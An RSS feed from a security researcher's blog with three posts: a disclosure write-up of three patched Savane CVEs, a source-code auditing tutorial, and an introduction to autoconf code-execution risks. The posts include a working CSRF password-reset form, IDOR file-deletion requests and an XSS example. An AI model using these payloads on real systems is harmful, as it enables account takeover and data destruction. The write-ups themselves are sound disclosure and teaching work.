<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>Posts on Ally Petitt</title>
    <link>http://localhost:1313/ally-petitt/posts/</link>
    <description>Recent content in Posts on Ally Petitt</description>
    <generator>Hugo -- 0.125.4</generator>
    <language>en-us</language>
    <lastBuildDate>Thu, 21 Mar 2024 00:00:00 +0000</lastBuildDate>
    <atom:link href="http://localhost:1313/ally-petitt/posts/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>How I Found 3 CVEs in 2 Days</title>
      <link>http://localhost:1313/ally-petitt/posts/2024-03-21_how-i-found-3-cves-in-2-days-8a135eb924d3/</link>
      <pubDate>Thu, 21 Mar 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2024-03-21_how-i-found-3-cves-in-2-days-8a135eb924d3/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*wGuRqNuBuFV5u69n.png&#34; alt=&#34;&#34;  /&gt;

Author: Ally Petitt&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Christmas break is notoriously refreshing for high schoolers like myself, however, unlike most high school students, I got to spend mine doing the most fascinating work in the world: security research.&lt;/p&gt;
&lt;p&gt;I had previously used Savannah, a GNU bug tracker, to submit a bug report, so when I noticed that the underlying technology, &lt;a href=&#34;https://git.savannah.nongnu.org/cgit/administration/savane.git/&#34;&gt;Savane&lt;/a&gt;, was open source, I knew I had to put it on my list of research projects. To my surprise, I was able to discover 3 CVEs within the span of 2 days including insecure access control, cross-site request forgery (CSRF), and a bad seed vulnerability in Savane v3.12 and prior versions.&lt;/p&gt;
&lt;p&gt;Testing Environment:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Firefox v103.0 (64-bit)&lt;/li&gt;
&lt;li&gt;Debian 12, stable-slim Docker container&lt;/li&gt;
&lt;li&gt;PHP development server&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Note that these aren’t all-encompassing results as my short audit of this application was only over the course of a few days.&lt;/p&gt;
&lt;h1 id=&#34;methodology&#34;&gt;Methodology&lt;/h1&gt;
&lt;p&gt;This audit consisted of both dynamic and static analysis. The majority of my source code analysis methodology can be found &lt;a href=&#34;https://medium.com/@allypetitt/how-to-find-more-vulnerabilities-source-code-auditing-explained-2c8a10896374&#34;&gt;here&lt;/a&gt;. For the sake of brevity, I will only include relevant details for this article. My first step was configuring a local development environment via a &lt;a href=&#34;https://gist.github.com/ally-petitt/3490c857b4c6eeea860c6e094ce47ce3&#34;&gt;Dockerfile I&lt;/a&gt; created.&lt;/p&gt;
&lt;p&gt;With a running instance of Savane, I shifted my focus to source code analysis, pinpointing files of particular interest for security issues including &lt;code&gt;utils.php&lt;/code&gt;, &lt;code&gt;upload.php&lt;/code&gt;, and &lt;code&gt;users.php&lt;/code&gt;. While there were interesting leads, many of them did not pan out how I had hoped, so I began to parse through functionalities with more potential for impact. This led me to authenticated functionalities since any user can create an account and expands the attack surface drastically.&lt;/p&gt;
&lt;h1 id=&#34;account-management&#34;&gt;Account Management&lt;/h1&gt;
&lt;p&gt;I began by assessing account management functionalities such as updating passwords and changing email addresses for Cross-Site Request Forgery (CSRF) or access control vulnerabilities since they happened to be at the forefront of my mind at the time of this audit.&lt;/p&gt;
&lt;p&gt;The majority of the critical account management functionalities appeared to be protected by a&lt;code&gt;form_id&lt;/code&gt; parameter, which contained a randomized string in each request. In effect, &lt;code&gt;form_id&lt;/code&gt; acted as a CSRF token.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Q3BI1WCSQj8kJmb7iCEh4g.png&#34; alt=&#34;&#34;  /&gt;

Additionally, attempting to change the password required the previous user password to be known, which provided no advantage over attempting to brute-force their password to begin with.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*IcA_HpVxf3LP9FlM7miVUw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;http://172.17.0.2:7890/my/admin/change.php?item=password&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;With these precautions in place, it was evident that further investigation was required.&lt;/p&gt;
&lt;h2 id=&#34;cve-202427631csrf-cwe-352&#34;&gt;CVE-2024–27631 — CSRF (CWE-&lt;strong&gt;352)&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;I suspected that there may be additional critical vulnerabilities without CSRF protection. Specifically, I began to look inside of admin folders in the source code, eventually finding &lt;code&gt;siteadmin/usergroup.php&lt;/code&gt;, which enabled superusers to edit of any user’s profile.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*_stvfUY2HtkR9wda-TgZQQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Example of /siteadmin/usergroup.php to edit the account of user 60079&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;This page contained three unprotected functionalities of interest. The first was a function that can be used to grant a user admin flags, leading to privilege escalation without account takeover.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*TDquE7S3UnTHXilR4TYrVA.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/siteadmin/usergroup.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;The second and third functionalities could be leveraged for account takeover by either changing the email address of a user’s account:&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*HvHtu0HaoxRLzojL3vjfPQ.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/siteadmin/usergroup.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Or, changing the password of any user’s account.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*-N45bZ7BrPdguKZWsQs0cw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/siteadmin/user_changepw.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Given these promising leads, I began to develop a Proof-of-Concept (PoC) to demonstrate that the vulnerability existed in practice. (I have found that with static analysis, sometimes a detail in the code can be overlooked that actually mitigates the vulnerability.) The following is what I came up with and successfully tested:&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!-- The efficacy of this payload is browser-dependent --&amp;gt;  
&amp;lt;form id=&amp;#34;autosubmit&amp;#34; action=&amp;#34;http://&amp;lt;savane\_instance&amp;gt;/siteadmin/user\_changepw.php&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;  
  
 &amp;lt;input name=&amp;#34;form\_pw&amp;#34; type=&amp;#34;hidden&amp;#34; value=&amp;#34;Password1!&amp;#34; /&amp;gt;  
 &amp;lt;input name=&amp;#34;form\_pw2&amp;#34; type=&amp;#34;hidden&amp;#34; value=&amp;#34;Password1!&amp;#34; /&amp;gt;  
 &amp;lt;input name=&amp;#34;user\_id&amp;#34; type=&amp;#34;hidden&amp;#34; value=&amp;#34;&amp;lt;user\_id&amp;gt;&amp;#34; /&amp;gt;  
 &amp;lt;input name=&amp;#34;update&amp;#34; type=&amp;#34;hidden&amp;#34; value=&amp;#34;Update&amp;#34; /&amp;gt;  
 &amp;lt;input type=&amp;#34;submit&amp;#34; value=&amp;#34;Submit Request&amp;#34; /&amp;gt;  
&amp;lt;/form&amp;gt;  
  
&amp;lt;script&amp;gt;  
 document.getElementById(&amp;#34;autosubmit&amp;#34;).submit();  
&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Thus, I discovered CVE-2024–27631! A patch was implemented in &lt;a href=&#34;https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&amp;amp;id=d3962d3feb75467489b869204db98e2dffaaaf09&#34;&gt;this commit&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;cve-202427632bad-seed-cwe-335&#34;&gt;CVE-2024–27632 — Bad Seed (CWE-335)&lt;/h2&gt;
&lt;p&gt;While tracing CSRF-related functionalities in the code, I came across the logic for generating and serving the CSRF tokens, or form IDs. The execution flow is as follows:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Protected PHP pages contain a call to &lt;code&gt;form_header()&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;form_header()&lt;/code&gt; function seeds the current Unix timestamp.&lt;/li&gt;
&lt;li&gt;A random number is chosen and hashed to create &lt;code&gt;form_id&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;The form ID is added as a hidden element in the form on the protected page.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;The definition of &lt;code&gt;form_header()&lt;/code&gt; can be seen in the image below.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Zs5bxl01fMcxsXTfZd4mzw.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/include/form.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;I was particularly interested in the mechanism behind seeding the Pseudo-Random Number Generator (&lt;a href=&#34;https://en.wikipedia.org/wiki/Pseudorandom_number_generator&#34;&gt;PRNG&lt;/a&gt;), which occured in &lt;code&gt;utils_srand()&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*SIBvRLsqwT0QVwFI1ZczrA.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;frontend/php/include/utils.php&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;It was apparent that &lt;code&gt;[mt\_srand()](https://www.php.net/manual/en/function.mt-srand.php)&lt;/code&gt; was used to seed the &lt;a href=&#34;https://www.php.net/manual/en/function.microtime.php&#34;&gt;Unix timestamp&lt;/a&gt; (learn more about PRNGs &lt;a href=&#34;https://www.geeksforgeeks.org/pseudo-random-number-generator-prng/&#34;&gt;here&lt;/a&gt;). Since this function is called when a protected page is loaded, the seed is renewed with the current time upon visiting the page. If the timestamp that a victim visited a page is known, can be approximated, or can be otherwise triggered, it is possible to independently generate the exact same form ID token, passing the CSRF check! This would allow for CSRF attacks on arbitrary form submissions, leading to potential account takeover.&lt;/p&gt;
&lt;p&gt;Savane v3.13 contains a patch implemented in this &lt;a href=&#34;https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&amp;amp;id=dee5195d18f9ab16c860e8114819083673f66b95&#34;&gt;commit&lt;/a&gt;.&lt;/p&gt;
&lt;h1 id=&#34;group-management-functionalities&#34;&gt;Group Management Functionalities&lt;/h1&gt;
&lt;p&gt;Another class of functionalities I began to explore was group management. I tested CRUD (Create, Read, Update, and Delete) functionalities utilized when submitting a bug report to a group. I was unable to exploit file uploads in bug reports (I may address this in a future article if enough people are interested), however, I was vigilant on access control issues when I observed the web traffic for deleting an uploaded attachment.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4Pup6AnABk8L9bM8QGeGow.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;Deleting a file attachment with ID 40225&lt;/em&gt;&lt;/p&gt;
&lt;h2 id=&#34;cve-202427630idor-cwe-639&#34;&gt;CVE-2024–27630 — IDOR (&lt;strong&gt;CWE-639&lt;/strong&gt;)&lt;/h2&gt;
&lt;p&gt;Upon submitting a bug report, uploaded files are deposited in the uploads directory (&lt;code&gt;/var/lib/savane/trackers_attachments&lt;/code&gt;) with a file name equivalent to the file’s ID.&lt;/p&gt;
&lt;p&gt;Naturally, I began to investigate the process of deleting a file, a function only accessible to tracker admins. The following function is responsible for handling file deletion on attachments (&lt;code&gt;frontend/php/include/trackers/data.php:2417&lt;/code&gt;):&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;function trackers\_data\_delete\_file ($group\_id, $item\_id, $file\_id)  
{  
 global $sys\_trackers\_attachments\_dir;  
 # Make sure the attachment belongs to the group.  
 $res = db\_execute (&amp;#34;  
 SELECT bug\_id from &amp;#34; . ARTIFACT . &amp;#34; WHERE bug\_id = ? AND group\_id = ?&amp;#34;,  
 [$item\_id, $group\_id]  
 );  
 if (db\_numrows ($res) &amp;lt;= 0)  
 {  
 # TRANSLATORS: the argument is item id (a number).  
 $msg = sprintf (  
 \_(&amp;#34;Item #%s doesn&amp;#39;t belong to project&amp;#34;), $item\_id  
 );  
 fb ($msg, 1);  
 return;  
 }  
  
 $result = false;  
 # Delete the attachment.  
 if (unlink (&amp;#34;$sys\_trackers\_attachments\_dir/$file\_id&amp;#34;))   
 $result = db\_execute (&amp;#34;  
 DELETE FROM trackers\_file WHERE item\_id = ? AND file\_id = ?&amp;#34;,  
 [$item\_id, $file\_id]  
 );
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The user can control the &lt;code&gt;$item_id&lt;/code&gt; and &lt;code&gt;$file_id&lt;/code&gt; parameters through the URI. Can you spot the vulnerability? It is subtle.&lt;/p&gt;
&lt;p&gt;Note that there is input validation ensure the &lt;code&gt;$file_id&lt;/code&gt; is a number. Otherwise, there would be a directory traversal vulnerability allowing for arbitrary file deletion.&lt;/p&gt;
&lt;p&gt;The function first checks if the user is part of the group corresponding to the &lt;code&gt;$item_id&lt;/code&gt; and proceeds to delete the attachment before running a SQL query updating the database. The &lt;code&gt;$file_id&lt;/code&gt; is not checked at all! This means that as long as the attacker is an admin of the group referenced in &lt;code&gt;$item_id&lt;/code&gt;, they could delete any file.&lt;/p&gt;
&lt;p&gt;I was quite surprised to have spotted this discrepency, but very pleased. The following steps can be taken to reproduce the vulnerability:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Have an account that is an admin of a group with a bugtracker (attacker account).&lt;/li&gt;
&lt;li&gt;With a separate user account (victim), upload a file attachment in a bug report to a group that the attacker is not an admin of. A sample of the subsequent upload directory is as follows:&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@60ae93fe131f:/var/lib/savane/trackers\_attachments# ls  
40226 40227 40230 40231
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;
&lt;p&gt;Visit the homepage of the group that the attacker is an admin of. Then, visit Bugs &amp;gt; Browse and note a valid Item ID on the leftmost column of the table. This ID will be used in the next step.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;As the attacker, make a get request to the path &lt;code&gt;/bugs/index.php?func=delete_file&amp;amp;item_id=&amp;lt;ATTACKER_ITEM_ID&amp;gt;&amp;amp;item_file_id=&amp;lt;FILE_ID_TO_DELETE&amp;gt;&lt;/code&gt;.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;In my case, this looks like &lt;a href=&#34;http://172.17.0.2:7890/bugs/index.php?func=delete_file&amp;amp;item_id=50697&amp;amp;item_file_id=40231&#34;&gt;http://172.17.0.2:7890/bugs/index.php?func=delete_file&amp;amp;item_id=50697&amp;amp;item_file_id=40231&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Verify that the victim’s file (from a group the attacker doesn’t have privileges on) has been deleted.&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;root@60ae93fe131f:/var/lib/savane/trackers\_attachments# ls  
40226 40227 40230
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Due to the incremental file names, it is possible for an attacker to iteratively delete every file attachment on the web server! Since recently uploaded files harbor the highest file ID numbers, an attacker can upload a file, observe the ID, and delete every ID below that number as one would in an Insecure Direct Object Reference (IDOR) vulnerabillity. This vulnerability was patched &lt;a href=&#34;https://git.savannah.nongnu.org/cgit/administration/savane.git/commit/?h=i18n&amp;amp;id=39180aea8f38425035b4d1e73819b58007ac6e83&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;thanks&#34;&gt;Thanks&lt;/h2&gt;
&lt;p&gt;Special thanks to Ineiev, the maintainer of Savane. He was very receptive to my responsible disclosure and helped take steps to patch it.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;Combing through Savane’s source code was one of the highlights of my Christmas break. While discovering 3 CVEs came as a surprise, I am appreciative of the educational value of this experience. I hope that you learned something from this writeup. If you have any questions or comments, feel free to reach out to me on &lt;a href=&#34;https://www.linkedin.com/in/ally-petitt/&#34;&gt;LinkedIn&lt;/a&gt;!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>How to Find more Vulnerabilities — Source Code Auditing Explained</title>
      <link>http://localhost:1313/ally-petitt/posts/2024-01-01_how-to-find-more-vulnerabilities---source-code-auditing-explained-2c8a10896374/</link>
      <pubDate>Mon, 01 Jan 2024 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2024-01-01_how-to-find-more-vulnerabilities---source-code-auditing-explained-2c8a10896374/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*jDmBerRWYf3eZh2J&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://images.pexels.com/photos/374559/pexels-photo-374559.jpeg?auto=compress&amp;amp;amp;cs=tinysrgb&amp;amp;amp;w=1260&amp;amp;amp;h=750&amp;amp;amp;dpr=1&#34;&gt;https://images.pexels.com/photos/374559/pexels-photo-374559.jpeg?auto=compress&amp;amp;amp;cs=tinysrgb&amp;amp;amp;w=1260&amp;amp;amp;h=750&amp;amp;amp;dpr=1&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Whitebox penetration testing can be intimidating. Complex web applications may contain hundreds of thousands of lines of code and deciphering the connection between the various web components and their numerous implementations is challenging. A powerful, yet simple technique to approach the code review of such an application is to break it into manageable pieces.&lt;/p&gt;
&lt;p&gt;In this article, I will be outlining a methodology that can be used to break down large web applications, such as Content Management Systems (CMSs) into manageable components that can be systematically analyzed for vulnerabilities or logic errors. This is the approach that I used to discover CVE-2023–43154 and it is the approach taught in the AWAE, OffSec’s prerequisite course to the OffSec Web Expert (OSWE) certification.&lt;/p&gt;
&lt;p&gt;Note that this article has an emphasis on web security, but the methodology can be applied to other fields of research as well.&lt;/p&gt;
&lt;p&gt;Let’s begin.&lt;/p&gt;
&lt;h1 id=&#34;methodology&#34;&gt;Methodology&lt;/h1&gt;
&lt;p&gt;At a high level, this methodology begins with gaining familiarity with the application as a whole. This phase includes&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Identifying the technology stack — programming language, templating engine, database, etc..&lt;/li&gt;
&lt;li&gt;Mapping out the application to gain a high-level overview of the structure of the project — commands like &lt;code&gt;tree -L 3&lt;/code&gt; may be used.&lt;/li&gt;
&lt;li&gt;Reading documentation&lt;/li&gt;
&lt;li&gt;Understanding common use cases of the application&lt;/li&gt;
&lt;li&gt;Exploring the application through its interface&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;These steps help to develop a holistic understanding of the application. This enables you to better relate your subsequent findings to how the application is used, aiding in a more accurate assessment of impact and the likelihood of a successful exploit.&lt;/p&gt;
&lt;p&gt;Then, the approach can branch into either of two directions: bottom-up or top-down. To understand what this means, it is first important to define what is meant by a “source” and a “sink”. From there, it will become more clear what is meant by the aforementioned approaches.&lt;/p&gt;
&lt;h2 id=&#34;sources-andsinks&#34;&gt;Sources and Sinks&lt;/h2&gt;
&lt;p&gt;Vulnerabilities in web applications commonly arise from the manner in which user input is handled. The entry point for user input is referred to as a source. An example of this would be input from a form, a query parameter in the URL, or a cookie. These are sources of user input that are then interpreted and handled by the web application.&lt;/p&gt;
&lt;p&gt;A sink, on the contrary, is where the user input is actually used. This is where the vulnerability occurs. In the case of a SQL injection, the source may be a query parameter that has contents concatenated with a SQL query.&lt;/p&gt;
&lt;p&gt;To further illustrate this point, I will provide an example. The vulnerable PHP code below has a source, &lt;code&gt;comment&lt;/code&gt; , and a sink, &lt;code&gt;&amp;lt;?php echo $_GET[‘comment’]; ?&amp;gt;&lt;/code&gt;. The lack of sanitization on the PHP code as it echos the user input results in an XSS vulnerability.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;&amp;lt;!-- Source: https://example.com/?comment=&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt; --&amp;gt;  
&amp;lt;div id=&amp;#34;comment&amp;#34;&amp;gt;  
 &amp;lt;!-- Sink --&amp;gt;  
 &amp;lt;?php echo $\_GET[&amp;#39;comment&amp;#39;]; ?&amp;gt;   
&amp;lt;/div&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;For a more visual explanation, this &lt;a href=&#34;https://youtu.be/ZaOtY4i5w_U?si=zXfJBsNlhp4h-CLa&#34;&gt;LiveOverflow&lt;/a&gt; video provides an excellent demonstration of the topic.&lt;/p&gt;
&lt;h2 id=&#34;bottom-up-approach&#34;&gt;Bottom-Up Approach&lt;/h2&gt;
&lt;p&gt;The bottom-up approach refers to first locating sinks and tracing the code “upwards” to the source. For instance, I may search the code base for all occurrences of the sink &lt;code&gt;system()&lt;/code&gt;, and from there follow the value that is passed into the function to search for any user input that may be implemented into that parameter.&lt;/p&gt;
&lt;p&gt;Regular expressions are a common technique to speed up the process of finding sinks. Patterns such as &lt;code&gt;^.*unserialize\(.+\)&lt;/code&gt; may be used to locate specific sinks (in this case, the &lt;code&gt;unserialize()&lt;/code&gt; function) with more accuracy and can be used to narrow down the search effort. It is important to note, however, that this method has limitations. The regex results are only as strong as the pattern used and even well-established regular expressions can miss vulnerabilities and sinks.&lt;/p&gt;
&lt;p&gt;This method is generally more tedious since not all occurrences of a sink will be used in the context of user-controlled data. Therefore, there can be more code to parse through in order to find a bug. Despite its repetitiveness, this approach has the advantage of increasing the likelihood of finding &lt;strong&gt;higher severity and less accessible vulnerabilities&lt;/strong&gt; that are very difficult, if not impossible, to discover without access to the source code.&lt;/p&gt;
&lt;h2 id=&#34;top-down-approach&#34;&gt;Top-Down Approach&lt;/h2&gt;
&lt;p&gt;On the contrary, the top-down approach consists of identifying sources and following their implementation in the code until a sink is found. For instance, I may submit the string &lt;code&gt;“test”&lt;/code&gt; into a &lt;code&gt;EditProfile&lt;/code&gt; functionality on a website. A top-down approach would consist of finding where the &lt;code&gt;“test”&lt;/code&gt; string is received in the code and following the logic used on it until I locate its sink, or implementation, in a SQL query.&lt;/p&gt;
&lt;p&gt;Regular expressions can be used here as well. A basic example is &lt;code&gt;^.*?query&lt;/code&gt; to find query parameters. Regular expressions will typically become more complex depending on the specific context and the vulnerabilities that they are searching for.&lt;/p&gt;
&lt;p&gt;This approach excels in finding vulnerabilities that are &lt;strong&gt;more accessible, but typically less severe&lt;/strong&gt;. To clarify, high severity and high accessibility vulnerabilities can be discovered through either approach. One approach will simply increase your likelihood of finding a particular kind of vulnerability and the one that is chosen will depend on the individual priorities of the code review.&lt;/p&gt;
&lt;h2 id=&#34;functionality-based-approach&#34;&gt;Functionality-Based Approach&lt;/h2&gt;
&lt;p&gt;A different perspective on code review is breaking the application down into sections based on functionality. Instead of starting broad with all of the application’s sources or sinks and then narrowing down into a vulnerable one, this approach involves starting narrow with one functionality and learning how it works on a deeper level in order to search for vulnerabilities in that particular segment of the application.&lt;/p&gt;
&lt;p&gt;This approach is particularly useful when prioritizing certain types of vulnerabilities based on factors such as required authentication level. In this instance, one can curate a list of functionalities that can be used without authentication and analyze those for vulnerabilities. Prioritization is a useful tool when auditing large code bases to increase the chances of finding higher severity vulnerabilities or medium-low severity vulnerabilities that can more elegantly be chained together to result in a higher-severity attack.&lt;/p&gt;
&lt;h1 id=&#34;tooling&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*UPqLe8hb4dLd2h30&#34; alt=&#34;&#34;  /&gt;

Tooling&lt;/h1&gt;
&lt;p&gt;I previously mentioned that searching through the code with regular expressions can be used to quickly identify sources and sinks. In addition to this, tools such as Semgrep can also be used to grep for certain patterns in the code. Semgrep looks at the code as more than a text file. It develops and abstract syntax tree (AST) in order to better understand the semantics. This can lead to its recognition of a certain vulnerable pattern in code that a regex pattern would miss. On the other hand, both are only as strong as the way they were written and they can lead to many false positives.&lt;/p&gt;
&lt;p&gt;Static Application Security Testing (SAST) solutions can also aide in identifying vulnerabilities. &lt;a href=&#34;https://spectralops.io/&#34;&gt;SpectralOps&lt;/a&gt;, Checkmarx, and Veracode are all examples of SAST tools used by organizations. I have not tried any of these at the time of writing, so I can not recommend one with certainty. SAST tools are generally meant for use by developers in the CI/CD pipeline, but they can also be used by researchers.&lt;/p&gt;
&lt;h1 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h1&gt;
&lt;p&gt;The approach to static analysis that you use will impact the types of vulnerabilities that you are more likely and their likelihood of being exploitable. I encourage you to experiment with different approaches to static analysis and decide for yourself which methods work best for your goals. A mixed approach is quite common and even encouraged for best results.&lt;/p&gt;
&lt;p&gt;Happy hacking!&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Stealthy Exploit Opens Door for Pre-Compilation Code Execution</title>
      <link>http://localhost:1313/ally-petitt/posts/2023-12-02_stealthy-exploit-opens-door-for-pre-compilation-code-execution-17a57b9585cb/</link>
      <pubDate>Sat, 02 Dec 2023 00:00:00 +0000</pubDate>
      <guid>http://localhost:1313/ally-petitt/posts/2023-12-02_stealthy-exploit-opens-door-for-pre-compilation-code-execution-17a57b9585cb/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*XwuUEqGz-1xT_v_j.jpg&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://img.rasset.ie/001babea-1600.jpg&#34;&gt;https://img.rasset.ie/001babea-1600.jpg&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;introduction&#34;&gt;Introduction&lt;/h1&gt;
&lt;p&gt;Linux users often take pride in their ability to compile their own code. In spite of this, a subtle yet critical attack vector has existed for over 20 years with high potential impact when exploited. Cleverly disguised within the &lt;code&gt;configure.ac&lt;/code&gt; file, this attack vector allows malicious actors to execute code on your system before the compilation process even begins.&lt;/p&gt;
&lt;p&gt;While the absence of known exploits may lull users into a false sense of security, it is precisely this lack of awareness that makes this attack vector dangerous, increasing the chances of successful and large-scale exploitation.&lt;/p&gt;
&lt;p&gt;The security concern that I am referring to is the ability to execute arbitrary code through &lt;code&gt;autoconf&lt;/code&gt;.&lt;/p&gt;
&lt;h1 id=&#34;what-is-autoconf&#34;&gt;What is Autoconf?&lt;/h1&gt;
&lt;p&gt;Traditionally, developers have used a &lt;a href=&#34;https://www.gnu.org/software/automake/manual/html_node/GNU-Build-System.html&#34;&gt;build system&lt;/a&gt; in order to distribute software packages that are easy for clients to compile. These build steps are specified in a Makefile.&lt;/p&gt;
&lt;p&gt;Different systems have different requirements. Sometimes, they require different flags to be set during compilation and sometimes the compiler is referred to by a different name. With such a diverse array of systems and configurations to cater to, Autoconf was offered as a solution.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*WhDuZ1uRN5oHHeR9&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;GNU Logo&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;Autoconf is a crucial part of the GNU Autotools project and it ensures that packages are portable across different systems. It accomplishes this through macros from the M4 programming language to create a shell script that configures software source code packages for the respective system (see the &lt;a href=&#34;https://github.com/autotools-mirror/autoconf&#34;&gt;README&lt;/a&gt; for more information).&lt;/p&gt;
&lt;h1 id=&#34;how-does-autoconfwork&#34;&gt;How Does Autoconf Work?&lt;/h1&gt;
&lt;p&gt;Autoconf is one of the first commands executed when building a package that follows &lt;a href=&#34;https://www.gnu.org/prep/standards/standards.html&#34;&gt;GNU Coding Standards&lt;/a&gt; (which is a lot of packages). If not called directly, it is often included in an &lt;code&gt;autogen.sh&lt;/code&gt; script. The program uses instructions from a &lt;code&gt;configure.ac&lt;/code&gt; file to generate a dynamic &lt;code&gt;configure&lt;/code&gt;bash script that is responsible for matching the libraries on the system to those required in the program.&lt;/p&gt;
&lt;h1 id=&#34;the-securityconcern&#34;&gt;The Security Concern&lt;/h1&gt;
&lt;p&gt;Because Autoconf interprets user-controlled input through the &lt;code&gt;configure.ac&lt;/code&gt; file, it is possible to insert malicious code that gets executed upon the running the generated &lt;code&gt;configure&lt;/code&gt; file.&lt;/p&gt;
&lt;p&gt;Furthermore, and increasingly concerning, is the possibility of obtaining code execution upon execution of the &lt;code&gt;autoconf&lt;/code&gt; command- before the generated &lt;code&gt;configure&lt;/code&gt; file is even ran. This means one less step in order to pwn a computer.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Hgtdvi95rRshZbBM.png&#34; alt=&#34;&#34;  /&gt;

For example, hackers can embed a malicious payload within the &lt;code&gt;configure.ac&lt;/code&gt; file and when an unsuspecting Linux user begins building the package, the attacker-controlled code would be executed on the system.&lt;/p&gt;
